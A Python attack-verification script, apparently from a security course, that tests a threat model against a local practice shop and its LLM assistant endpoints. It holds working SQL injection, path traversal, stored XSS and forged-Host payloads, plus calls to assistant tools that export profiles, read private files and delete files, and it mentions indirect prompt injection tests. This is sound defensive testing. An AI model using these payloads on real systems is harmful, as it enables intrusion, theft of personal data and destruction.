"""Атаки на Mini Shop по модели угроз THREAT_MODEL.md.

Только стандартная библиотека. По функции на каждую угрозу, проверяемую
HTTP-запросом. Базовый URL и каталог вывода задаются аргументами командной
строки, чтобы тот же скрипт можно было перезапустить после исправлений с
выводом в evidence/after.

Использование:
    python3 attacks.py --base http://127.0.0.1:8066 --out ../evidence/before
    python3 attacks.py --base http://127.0.0.1:8066 --out ../evidence/after \
        --sandbox-root /tmp/itmo-practice-06-XXXX --after

Повтор после исправлений (этап 6): сервис требует X-Token, поэтому каждая атака,
которая раньше шла анонимно, выполняет тот же запрос дважды — анонимно (как
раньше) и с токеном учебного клиента alice (staff — там, где маршрут теперь
только для сотрудника). Полезная нагрузка атак не менялась. T02 перенесена в
конец: блокировка входа после неудачных попыток иначе мешала бы логину alice в
остальных атаках.

Каждая атака сохраняет <out>/<ID>.json: сырые запросы и ответы как есть плюс
итог (подтверждена / не подтверждена) с одной фразой-причиной. Общий итог —
<out>/summary.json. Угрозы, которые запросом не проверить, в summary.json
помечены «подтверждена чтением кода» со ссылкой на строку service.py.

Все атаки выполняются только против локального процесса на 127.0.0.1 и его
синтетических данных. Разрушающая атака (delete_tree) выполняется последней.
"""

import argparse
import http.client
import json
import os
from urllib.parse import quote, urlsplit


# --------------------------------------------------------------------------
# Низкоуровневый HTTP-клиент: фиксирует запрос и ответ как есть.
# --------------------------------------------------------------------------

def send(base, method, path, body=None, headers=None, raw_body=None,
         content_type=None, host_override=None):
    """Выполнить один запрос и вернуть запись {request, response}."""
    u = urlsplit(base)
    conn = http.client.HTTPConnection(u.hostname, u.port, timeout=15)
    hdrs = dict(headers or {})

    if raw_body is not None:
        data = raw_body.encode("utf-8") if isinstance(raw_body, str) else raw_body
        sent_body = raw_body if isinstance(raw_body, str) else "<bytes>"
    elif body is not None:
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        hdrs.setdefault("Content-Type", "application/json")
        sent_body = body
    else:
        data = None
        sent_body = None
    if content_type is not None:
        hdrs["Content-Type"] = content_type

    # Пробелы и кавычки в инъекциях нужно percent-кодировать для транспорта;
    # сервер их декодирует через parse_qs и получает исходную строку.
    safe_path = quote(path, safe="/?=&%")
    conn.putrequest(method, safe_path, skip_host=(host_override is not None))
    if host_override is not None:
        conn.putheader("Host", host_override)
    if data is not None:
        conn.putheader("Content-Length", str(len(data)))
    for k, v in hdrs.items():
        conn.putheader(k, v)
    conn.endheaders(data if data is not None else None)

    resp = conn.getresponse()
    text = resp.read().decode("utf-8", "replace")
    record = {
        "request": {
            "method": method,
            "path": path,
            "headers": {**hdrs, **({"Host": host_override} if host_override else {})},
            "body": sent_body,
        },
        "response": {
            "status": resp.status,
            "headers": dict(resp.getheaders()),
            "body": text,
        },
    }
    try:
        record["response"]["json"] = json.loads(text)
    except ValueError:
        pass
    conn.close()
    return record


def login(base, username, password):
    """Залогиниться, вернуть (token|None, запись)."""
    rec = send(base, "POST", "/login", {"username": username, "password": password})
    token = None
    if isinstance(rec["response"].get("json"), dict):
        token = rec["response"]["json"].get("token")
    return token, rec


def files_state(base, sandbox_root=None):
    """Снимок состояния файлов стенда запросами к /files.

    После исправлений /files требует токен и отдаёт только свой чек, поэтому
    чеки проверяются токеном владельца (alice, bob); исходная анонимная проба
    private/ через user=.. сохранена. Если задан --sandbox-root, наличие всех
    трёх файлов дополнительно проверяется по файловой системе (on_disk).
    """
    tokens = {u: login(base, u, f"learn-{u}")[0] for u in ("alice", "bob")}
    probes = {
        "files/alice/receipt.txt": ("alice", "receipt.txt", tokens["alice"]),
        "files/bob/receipt.txt": ("bob", "receipt.txt", tokens["bob"]),
        "private/operator-note.txt": ("..", "private/operator-note.txt", None),
    }
    state = {}
    for label, (user, path, token) in probes.items():
        rec = send(base, "GET", f"/files?user={user}&path={path}",
                   headers={"X-Token": token} if token else None)
        body = rec["response"].get("json", rec["response"]["body"])
        content = body.get("content") if isinstance(body, dict) else None
        state[label] = {
            "status": rec["response"]["status"],
            "present": rec["response"]["status"] == 200 and content is not None,
            "content": content if content is not None else body,
        }
        if sandbox_root:
            state[label]["on_disk"] = os.path.isfile(os.path.join(sandbox_root, label))
    return state


def auth(base, username="alice"):
    """Заголовки с токеном учебной учётки — для повторов атак после введения входа."""
    return {"X-Token": login(base, username, f"learn-{username}")[0]}


def result(attack_id, route, category, severity, confirmed, why, records, extra=None):
    rec = {
        "id": attack_id,
        "route": route,
        "category": category,
        "severity": severity,
        "verdict": "подтверждена" if confirmed else "не подтверждена",
        "why": why,
        "records": records,
    }
    if extra:
        rec.update(extra)
    return rec


# --------------------------------------------------------------------------
# Атаки по угрозам. Каждая возвращает dict результата.
# --------------------------------------------------------------------------

def attack_T02(base):
    """T02: нет ограничения попыток входа."""
    recs = []
    for i in range(20):
        recs.append(send(base, "POST", "/login",
                         {"username": "alice", "password": f"wrong-{i}"}))
    ok, ok_rec = login(base, "alice", "learn-alice")
    recs.append(ok_rec)
    all_401 = all(r["response"]["status"] == 401 for r in recs[:20])
    confirmed = all_401 and ok is not None
    why = ("20 неверных паролей подряд не вызвали блокировку, 21-я верная "
           "попытка сразу выдала токен — подбор ничем не ограничен")
    return result("T02", "POST /login", "S", "Средняя", confirmed, why, recs)


def attack_T03(base):
    """T03: токен бессрочный, нет logout."""
    token, login_rec = login(base, "alice", "learn-alice")
    recs = [login_rec]
    use1 = send(base, "GET", "/orders", headers={"X-Token": token})
    recs.append(use1)
    logout = send(base, "POST", "/logout", {}, headers={"X-Token": token})
    recs.append(logout)
    use2 = send(base, "GET", "/orders", headers={"X-Token": token})
    recs.append(use2)
    confirmed = (logout["response"]["status"] == 404
                 and use2["response"]["status"] == 200)
    why = ("маршрута /logout нет (404), токен продолжает работать после "
           "попытки выхода — отозвать сессию нельзя")
    return result("T03", "POST /login, sessions", "S, E", "Средняя", confirmed, why, recs)


def attack_T06(base):
    """T06: IDOR на /profile без токена."""
    recs = [send(base, "GET", "/profile?id=2"),
            send(base, "GET", "/profile?id=2", headers=auth(base))]
    confirmed = any(rec["response"]["status"] == 200 and isinstance(rec["response"].get("json"), list)
                    and "TEST_BOB" in rec["response"]["body"] for rec in recs)
    why = "без токена id=2 вернул профиль bob (TEST_BOB) — чтение чужих ПДн анонимно"
    return result("T06", "GET /profile", "I, E", "Высокая", confirmed, why, recs)


def attack_T07(base):
    """T07: SQL-инъекция в /profile."""
    recs, both_profiles, union_ok = [], False, False
    for hdrs in (None, auth(base)):  # аноним и клиент alice
        r1 = send(base, "GET", "/profile?id=1 OR 1=1", headers=hdrs)
        r2 = send(base, "GET", "/profile?id=0 UNION SELECT id,product,price,owner FROM orders", headers=hdrs)
        recs += [r1, r2]
        b1 = r1["response"].get("json") or []
        b2 = r2["response"].get("json") or []
        both_profiles |= isinstance(b1, list) and len(b1) >= 2
        union_ok |= isinstance(b2, list) and any(
            "chair" in json.dumps(r, ensure_ascii=False) or "lamp" in json.dumps(r, ensure_ascii=False)
            for r in b2)
    confirmed = both_profiles and union_ok
    why = ("id=1 OR 1=1 вернул все профили, UNION SELECT подтянул строки таблицы "
           "orders — произвольное чтение БД через f-строку")
    return result("T07", "GET /profile", "I, T, D", "Критическая", confirmed, why, recs)


def attack_T08(base):
    """T08: SQL-инъекция в /search."""
    # После исправлений /search только для staff — инъекция повторяется и из staff-сессии.
    recs = [send(base, "GET", "/search?q=' UNION SELECT id,product,price,owner FROM orders --", headers=h)
            for h in (None, auth(base), auth(base, "staff"))]
    confirmed = any(isinstance(r["response"].get("json"), list) and any(
        "chair" in json.dumps(x, ensure_ascii=False) or "lamp" in json.dumps(x, ensure_ascii=False)
        for x in r["response"]["json"]) for r in recs)
    why = "UNION SELECT в q вытащил строки таблицы orders в выдачу /search"
    return result("T08", "GET /search", "I, D", "Критическая", confirmed, why, recs)


def attack_T09(base):
    """T09: /search без аутентификации, пустой q → все профили."""
    recs = [send(base, "GET", "/search?q="), send(base, "GET", "/search?q=", headers=auth(base))]
    confirmed = any(r["response"]["status"] == 200 and isinstance(r["response"].get("json"), list)
                    and len(r["response"]["json"]) >= 2 for r in recs)
    why = "пустой q без токена вернул все профили клиентов (ПДн)"
    return result("T09", "GET /search", "I", "Высокая", confirmed, why, recs)


def attack_T10(base):
    """T10: /orders без аутентификации и фильтра."""
    recs = [send(base, "GET", "/orders"), send(base, "GET", "/orders", headers=auth(base))]
    confirmed = False
    for r in recs:
        b = r["response"].get("json") or []
        owners = {row.get("owner") for row in b} if isinstance(b, list) else set()
        confirmed |= r["response"]["status"] == 200 and len(owners) >= 2
    why = "без токена /orders вернул заказы всех владельцев (owner 1 и 2)"
    return result("T10", "GET /orders", "I", "Высокая", confirmed, why, recs)


def attack_T11(base):
    """T11: цена заказа берётся из тела."""
    token, login_rec = login(base, "alice", "learn-alice")
    recs = [login_rec]
    r1 = send(base, "POST", "/orders", {"product": "chair", "price": 1},
              headers={"X-Token": token})
    r2 = send(base, "POST", "/orders", {"product": "chair", "price": -5000},
              headers={"X-Token": token})
    r3 = send(base, "POST", "/orders", {"product": "chair", "price": "free"},
              headers={"X-Token": token})
    recs += [r1, r2, r3]
    prices = [r["response"].get("json", {}).get("price") for r in (r1, r2, r3)]
    confirmed = prices[0] == 1 and prices[1] == -5000 and prices[2] == "free"
    why = ("сервер принял цену из тела: 1, -5000 и строку 'free' вместо каталожной "
           "5000 — подмена и отрицательная сумма")
    return result("T11", "POST /orders", "T", "Критическая", confirmed, why, recs,
                  {"prices_accepted": prices})


def attack_T12(base):
    """T12: заказ без полей аудита."""
    token, login_rec = login(base, "alice", "learn-alice")
    recs = [login_rec]
    r = send(base, "POST", "/orders", {"product": "lamp"}, headers={"X-Token": token})
    recs.append(r)
    fields = set((r["response"].get("json") or {}).keys())
    audit = {"time", "timestamp", "created_at", "source", "catalog_price"}
    confirmed = r["response"]["status"] == 201 and not (fields & audit)
    why = ("в созданном заказе нет времени, источника и каталожной цены — "
           "подмену цены (T11) невозможно доказать")
    return result("T12", "POST /orders", "R", "Низкая", confirmed, why, recs,
                  {"order_fields": sorted(fields)})


def attack_T13(base):
    """T13: /admin/export по заголовку X-Role без токена."""
    recs = [send(base, "GET", "/admin/export", headers={"X-Role": "staff"}),
            send(base, "GET", "/admin/export", headers={**auth(base), "X-Role": "staff"})]
    confirmed = any(r["response"]["status"] == 200 and isinstance(r["response"].get("json"), list)
                    and len(r["response"]["json"]) >= 2 for r in recs)
    why = "curl с X-Role: staff без токена выгрузил все профили — авторизация по заголовку клиента"
    return result("T13", "GET /admin/export", "E, S, I", "Критическая", confirmed, why, recs)


def attack_T14(base):
    """T14: /files читает чужой чек."""
    recs = [send(base, "GET", "/files?user=bob&path=receipt.txt"),
            send(base, "GET", "/files?user=bob&path=receipt.txt", headers=auth(base))]
    confirmed = any(r["response"]["status"] == 200
                    and "TEST_BOB" in (r["response"].get("json") or {}).get("content", "") for r in recs)
    why = "user=bob без токена вернул чек bob (TEST_BOB)"
    return result("T14", "GET /files", "I, E", "Высокая", confirmed, why, recs)


def attack_T15(base):
    """T15: обход внутренних границ Sandbox до private/."""
    variants = [
        ("user=..&path=private/operator-note.txt", "/files?user=..&path=private/operator-note.txt"),
        ("user=alice&path=../../private/operator-note.txt", "/files?user=alice&path=../../private/operator-note.txt"),
        ("user=../private&path=operator-note.txt", "/files?user=../private&path=operator-note.txt"),
    ]
    recs = []
    hit = False
    for hdrs in (None, auth(base)):  # аноним и клиент alice
        for _, path in variants:
            r = send(base, "GET", path, headers=hdrs)
            recs.append(r)
            content = (r["response"].get("json") or {}).get("content", "")
            if "TEST_ONLY_OPERATOR_SECRET" in content:
                hit = True
    why = ("параметры user/path с .. вывели за files/<user> и прочитали "
           "private/operator-note.txt (TEST_ONLY_OPERATOR_SECRET)")
    return result("T15", "GET /files", "I, E", "Критическая", hit, why, recs)


def attack_T16(base):
    """T16: ошибки ФС раскрывают абсолютный путь стенда."""
    recs = [send(base, "GET", p, headers=h) for h in (None, auth(base))
            for p in ("/files?user=alice&path=.", "/files?user=alice&path=missing.txt")]
    leaked = any("/tmp/" in r["response"]["body"] for r in recs)
    why = "ошибки path=. и несуществующего файла вернули абсолютный путь /tmp/... стенда"
    return result("T16", "GET /files", "I", "Средняя", leaked, why, recs)


def attack_T17(base):
    """T17: обработчик возвращает текст и тип исключения."""
    recs = [send(base, "GET", "/profile?id=1;DROP"),
            send(base, "GET", "/profile?id=1;DROP", headers=auth(base))]
    confirmed = any(r["response"]["status"] == 500 and "type" in (r["response"].get("json") or {})
                    for r in recs)
    why = "битый SQL вернул 500 с текстом исключения SQLite и его типом — разведка для инъекций"
    return result("T17", "Обработчик ошибок", "I", "Средняя", confirmed, why, recs)


def attack_T18_T19(base):
    """T18+T19: /debug/logs публичен и хранит пароли и токены открытым текстом."""
    # логинимся и используем токен в заголовке, чтобы он попал в журнал
    token, login_rec = login(base, "alice", "learn-alice")
    use = send(base, "GET", "/orders", headers={"X-Token": token})
    # Журнал читается анонимно, клиентом alice и staff (staff журнал разрешён — проверяется,
    # нет ли в нём секретов, T18).
    views = [send(base, "GET", "/debug/logs", headers=h)
             for h in (None, {"X-Token": token}, auth(base, "staff"))]
    recs = [login_rec, use] + views
    confirmed = any(r["response"]["status"] == 200 and "learn-alice" in r["response"]["body"]
                    and bool(token) and token in r["response"]["body"] for r in views)
    why = ("/debug/logs без токена отдал журнал с паролем 'learn-alice' в теле "
           "/login и токеном сессии из заголовка X-Token в открытом виде")
    return result("T18+T19", "GET /debug/logs", "I, S, E", "Критическая", confirmed, why, recs)


def attack_T20(base):
    """T20: /reviews без аутентификации, автор не сохраняется, product не сверяется."""
    r1 = send(base, "POST", "/reviews", {"product": "chair", "text": "anon-no-auth"})
    r2 = send(base, "POST", "/reviews", {"product": "not-a-real-product", "text": "bad product"})
    r3 = send(base, "POST", "/reviews", {"product": "not-a-real-product", "text": "bad product"},
              headers=auth(base))
    recs = [r1, r2, r3]
    confirmed = r1["response"]["status"] == 201 and 201 in (r2["response"]["status"], r3["response"]["status"])
    why = ("отзыв принят без токена и с несуществующим product; автор нигде "
           "не сохраняется — поддельные анонимные отзывы")
    return result("T20", "POST /reviews", "S, R", "Средняя", confirmed, why, recs)


def attack_T21(base):
    """T21: нет ограничения длины и типа text."""
    recs = []
    for hdrs in (None, auth(base)):  # аноним и клиент alice
        recs.append(send(base, "POST", "/reviews", {"product": "chair", "text": "A" * 10000}, headers=hdrs))
        recs.append(send(base, "POST", "/reviews", {"product": "chair", "text": {"nested": "object"}},
                         headers=hdrs))
    confirmed = any(recs[i]["response"]["status"] == 201 and recs[i + 1]["response"]["status"] == 201
                    for i in (0, 2))
    why = "принят отзыв 10 000 символов и отзыв, где text — объект, а не строка"
    return result("T21", "POST /reviews", "T, D", "Низкая", confirmed, why, recs)


def attack_T22(base):
    """T22: хранимый XSS в /reviews/view."""
    payload = "<script>fetch('/debug/logs')</script>"
    r0 = send(base, "POST", "/reviews", {"product": "chair", "text": payload})
    r1 = send(base, "POST", "/reviews", {"product": "chair", "text": payload}, headers=auth(base))
    r2 = send(base, "GET", "/reviews/view")
    recs = [r0, r1, r2]
    html = r2["response"]["body"]
    ctype = r2["response"]["headers"].get("Content-Type", "")
    confirmed = payload in html and "text/html" in ctype
    why = ("отзыв <script> вернулся в /reviews/view без экранирования с "
           "Content-Type text/html — хранимый XSS в источнике сервиса")
    return result("T22", "GET /reviews/view", "T, I, E", "Высокая", confirmed, why, recs)


def attack_T23(base):
    """T23: /assistant/context без токена, любой order_id."""
    recs = [send(base, "GET", "/assistant/context?order_id=2"),
            send(base, "GET", "/assistant/context?order_id=2", headers=auth(base))]
    confirmed = any(r["response"]["status"] == 200
                    and "lamp" in (r["response"].get("json") or {}).get("prompt", "") for r in recs)
    why = "без токена order_id=2 (заказ bob, lamp) попал в контекст помощника"
    return result("T23", "GET /assistant/context", "I", "Высокая", confirmed, why, recs)


def attack_T24(base):
    """T24: SQL-инъекция в order_id → ПДн профилей в промпт."""
    inj = "/assistant/context?order_id=0 UNION SELECT id,name,email,address FROM profiles"
    recs = [send(base, "GET", inj), send(base, "GET", inj, headers=auth(base))]
    confirmed = False
    for r in recs:
        prompt = (r["response"].get("json") or {}).get("prompt", "")
        confirmed |= "bob@example.invalid" in prompt and "TEST_ALICE" in prompt
    why = ("UNION SELECT в order_id подставил имена и email всех профилей прямо "
           "в промпт для внешней LLM")
    return result("T24", "GET /assistant/context", "I", "Критическая", confirmed, why, recs)


def attack_T25(base):
    """T25: нет проверки Content-Type и Host."""
    # text/plain тело всё равно разбирается как JSON
    r1 = send(base, "POST", "/reviews",
              raw_body=json.dumps({"product": "chair", "text": "csrf-text-plain"}),
              content_type="text/plain")
    # чужой Host принимается
    r2 = send(base, "GET", "/health", host_override="evil.example")
    recs = [r1, r2]
    confirmed = r1["response"]["status"] == 201 and r2["response"]["status"] == 200
    why = ("POST с Content-Type text/plain разобран как JSON (CSRF без preflight), "
           "запрос с Host: evil.example принят — нет защиты от DNS rebinding")
    return result("T25", "HTTP-обработчик", "T, S", "Средняя", confirmed, why, recs)


def attack_T27(base):
    """T27: разбор тела без проверки → 500 с деталями."""
    r1 = send(base, "POST", "/orders", raw_body="[]", content_type="application/json",
              headers={"X-Token": login(base, "alice", "learn-alice")[0]})
    r2 = send(base, "POST", "/reviews", raw_body="{}", content_type="application/json")
    r3 = send(base, "POST", "/reviews", raw_body="{}", content_type="application/json", headers=auth(base))
    recs = [r1, r2, r3]
    confirmed = any(r["response"]["status"] == 500 for r in recs)
    why = "тело-массив и тело без обязательных полей вызвали 500 с текстом исключения"
    return result("T27", "Разбор тела", "D", "Низкая", confirmed, why, recs)


def attack_L03(base):
    """L03: клиенту доступен export_profiles (чрезмерные полномочия)."""
    token, login_rec = login(base, "alice", "learn-alice")
    recs = [login_rec]
    r = send(base, "POST", "/assistant/execute",
             {"decision": {"tool": "export_profiles", "arguments": {}}},
             headers={"X-Token": token})
    recs.append(r)
    b = r["response"].get("json") or []
    confirmed = r["response"]["status"] == 200 and isinstance(b, list) and len(b) >= 2
    why = ("помощник клиента alice выполнил export_profiles и вернул все профили — "
           "инструмент с чрезмерными полномочиями доступен customer")
    return result("L03", "POST /assistant/execute", "E", "Критическая", confirmed, why, recs)


def attack_L04(base):
    """L04: /assistant/execute без токена."""
    r = send(base, "POST", "/assistant/execute",
             {"decision": {"tool": "export_profiles", "arguments": {}}})
    recs = [r]
    b = r["response"].get("json") or []
    confirmed = r["response"]["status"] == 200 and isinstance(b, list) and len(b) >= 2
    why = "export_profiles выполнен анонимно без X-Token — исполнитель не проверяет аутентификацию"
    return result("L04", "POST /assistant/execute", "S, E", "Критическая", confirmed, why, recs)


def attack_L05(base):
    """L05: read_file чужих файлов и private через execute."""
    token, login_rec = login(base, "alice", "learn-alice")
    recs = [login_rec]
    targets = ["files/bob/receipt.txt", "private/operator-note.txt",
               "files/alice/../../private/operator-note.txt"]
    leaked = []
    for path in targets:
        r = send(base, "POST", "/assistant/execute",
                 {"decision": {"tool": "read_file", "arguments": {"path": path}}},
                 headers={"X-Token": token})
        recs.append(r)
        content = (r["response"].get("json") or {}).get("content", "")
        if "TEST_BOB" in content or "TEST_ONLY_OPERATOR_SECRET" in content:
            leaked.append(path)
    confirmed = len(leaked) >= 2
    why = ("токеном alice read_file прочитал чек bob и служебную заметку private/ — "
           "путь не сверяется с файлами вызывающего")
    return result("L05", "POST /assistant/execute", "T, E", "Критическая", confirmed, why, recs,
                  {"leaked_paths": leaked})


def attack_L07(base):
    """L07: в контекст помощника попадают чужие данные."""
    # добавим отзыв с чужого «имени» и проверим утечку чужих ПДн через T24-подобный контекст
    send(base, "POST", "/reviews", {"product": "lamp", "text": "foreign review from bob side"})
    # то же от имени bob с токеном (после исправлений отзыв без входа не принимается)
    send(base, "POST", "/reviews", {"product": "lamp", "text": "foreign review from bob side"},
         headers=auth(base, "bob"))
    recs = [send(base, "GET", "/assistant/context?order_id=1"),
            send(base, "GET", "/assistant/context?order_id=1", headers=auth(base))]
    # все отзывы всех товаров в промпте заказа alice
    confirmed = any("foreign review from bob side" in (r["response"].get("json") or {}).get("prompt", "")
                    for r in recs)
    why = ("в контекст заказа alice попали отзывы по чужому товару (lamp) — "
           "в промпт склеиваются все отзывы всех пользователей")
    return result("L07", "GET /assistant/context", "I", "Высокая", confirmed, why, recs)


def attack_L08(base):
    """L08: число отзывов в контексте не ограничено."""
    # После исправлений контекст и отзывы требуют входа — поток идёт от клиента alice.
    hdrs = auth(base)
    before = send(base, "GET", "/assistant/context?order_id=1", headers=hdrs)
    len_before = len((before["response"].get("json") or {}).get("prompt", ""))
    for i in range(50):
        send(base, "POST", "/reviews", {"product": "chair", "text": f"flood-{i}-" + "x" * 200})
        send(base, "POST", "/reviews", {"product": "chair", "text": f"flood-{i}-" + "x" * 200}, headers=hdrs)
    after = send(base, "GET", "/assistant/context?order_id=1", headers=hdrs)
    len_after = len((after["response"].get("json") or {}).get("prompt", ""))
    recs = [before, after]
    confirmed = len_after > len_before + 50 * 150
    why = (f"50 отзывов раздули промпт помощника с {len_before} до {len_after} "
           "символов — потребление контекста не ограничено")
    return result("L08", "GET /assistant/context", "D", "Средняя", confirmed, why, recs,
                  {"prompt_len_before": len_before, "prompt_len_after": len_after})


def attack_L06(base, sandbox_root=None):
    """L06 (РАЗРУШАЮЩАЯ, выполняется последней): delete_tree удаляет файлы стенда."""
    before = files_state(base, sandbox_root)
    anon = send(base, "POST", "/assistant/execute",
                {"decision": {"tool": "delete_tree", "arguments": {"path": "files"}}})
    alice = send(base, "POST", "/assistant/execute",
                 {"decision": {"tool": "delete_tree", "arguments": {"path": "files"}}}, headers=auth(base))
    after = files_state(base, sandbox_root)
    recs = [anon, alice]
    receipts_gone = (not after["files/alice/receipt.txt"]["present"]
                     and not after["files/bob/receipt.txt"]["present"])
    confirmed = 200 in (anon["response"]["status"], alice["response"]["status"]) and receipts_gone
    why = ("анонимный delete_tree path='files' удалил чеки всех клиентов; до — "
           "присутствовали, после — /files отдаёт ошибку")
    return result("L06", "POST /assistant/execute", "D, T", "Критическая", confirmed, why, recs,
                  {"files_before": before, "files_after": after})


# Угрозы, не проверяемые запросом, — подтверждаются чтением кода.
CODE_READ = [
    {"id": "T04", "route": "POST /login", "category": "I", "severity": "Низкая",
     "verdict": "подтверждена чтением кода",
     "why": "сравнение пароля '!=' не за постоянное время", "code": "service.py:51"},
    {"id": "T05", "route": "accounts", "category": "I, S", "severity": "Низкая",
     "verdict": "подтверждена чтением кода",
     "why": "пароли захардкожены открытым текстом без хеширования", "code": "service.py:28-32"},
    {"id": "T26", "route": "Глобальная блокировка/память", "category": "D", "severity": "Средняя",
     "verdict": "подтверждена чтением кода",
     "why": "все запросы под одной RLock; logs/reviews/sessions растут без лимита "
            "(DoS специально не исполняется)", "code": "service.py:126,33-36,44"},
    {"id": "L01", "route": "/reviews → /assistant/context", "category": "T, E", "severity": "Высокая",
     "verdict": "проверяется на реальной модели",
     "why": "косвенная prompt injection — см. evidence/before/pi-*", "code": "service.py:84,95",
     # После исправлений L01 повторно проверена на реальной модели (REPORT_02.md, раздел 3).
     "after": {"verdict": "частично: проверена на реальной модели (см. REPORT_02.md, раздел 3)",
               "why": "модель не подчинилась ни одной из 3 инъекций; опасное решение сервер не "
                      "исполняет независимо от модели — см. evidence/after/pi-*",
               "code": "pi-*-execute.json, pi-forced-transfers.json"}},
    {"id": "L02", "route": "/assistant/context question", "category": "T", "severity": "Средняя",
     "verdict": "подтверждена чтением кода",
     "why": "question склеивается в промпт без разделителя (service.py:96); серверная "
            "защита — L03–L05", "code": "service.py:96"},
    {"id": "L09", "route": "/assistant/execute, журнал", "category": "R", "severity": "Средняя",
     "verdict": "подтверждена чтением кода",
     "why": "нет аудита действий помощника: журнал хранит только сырые запросы без "
            "пользователя/заказа/инструмента", "code": "service.py:44,99-109"},
]


# Порядок: неразрушающие сначала, delete_tree (L06) — последней из разрушающих;
# T02 (блокирует вход alice после 20 неудачных попыток) — в самом конце.
ATTACKS = [
    attack_T03, attack_T06, attack_T07, attack_T08, attack_T09,
    attack_T10, attack_T11, attack_T12, attack_T13, attack_T14, attack_T15,
    attack_T16, attack_T17, attack_T18_T19, attack_T20, attack_T21, attack_T22,
    attack_T23, attack_T24, attack_T25, attack_T27,
    attack_L03, attack_L04, attack_L05, attack_L07, attack_L08,
    attack_L06,  # разрушающая
    attack_T02,  # блокировка входа — после всех атак, которым нужен токен alice
]


def main():
    parser = argparse.ArgumentParser(description="Атаки на Mini Shop по модели угроз")
    parser.add_argument("--base", required=True, help="Базовый URL, напр. http://127.0.0.1:8066")
    parser.add_argument("--out", required=True, help="Каталог вывода доказательств")
    parser.add_argument("--sandbox-root", help="Каталог Sandbox сервиса: проверка файлов по ФС в L06")
    parser.add_argument("--after", action="store_true",
                        help="Повтор после исправлений: строки «чтение кода» помечаются для ревью")
    args = parser.parse_args()
    os.makedirs(args.out, exist_ok=True)

    summary = []
    for fn in ATTACKS:
        res = fn(args.base, args.sandbox_root) if fn is attack_L06 else fn(args.base)
        path = os.path.join(args.out, f"{res['id']}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(res, f, ensure_ascii=False, indent=2)
        summary.append({"id": res["id"], "route": res["route"], "category": res["category"],
                        "severity": res["severity"], "verdict": res["verdict"],
                        "why": res["why"], "evidence": f"{res['id']}.json"})
        print(f"{res['id']:9} {res['verdict']:12} {res['route']}")

    for cr in CODE_READ:
        if args.after:
            cr = {**cr, "verdict": "проверяется ревью кода и тестами (см. REPORT_02.md)", **cr.get("after", {})}
        verdict = cr["verdict"]
        summary.append({"id": cr["id"], "route": cr["route"], "category": cr["category"],
                        "severity": cr["severity"], "verdict": verdict,
                        "why": cr["why"], "evidence": cr.get("code", "")})
        print(f"{cr['id']:9} {verdict:28} {cr['route']}")

    with open(os.path.join(args.out, "summary.json"), "w", encoding="utf-8") as f:
        json.dump(summary, f, ensure_ascii=False, indent=2)

    confirmed = sum(1 for s in summary if s["verdict"] == "подтверждена")
    code_read = sum(1 for s in summary if s["verdict"] == "подтверждена чтением кода")
    model = sum(1 for s in summary if s["verdict"] == "проверяется на реальной модели")
    not_conf = sum(1 for s in summary if s["verdict"] == "не подтверждена")
    print(f"\nИтого: подтверждена запросом {confirmed}, чтением кода {code_read}, "
          f"на модели {model}, не подтверждена {not_conf}, всего {len(summary)}")


if __name__ == "__main__":
    main()
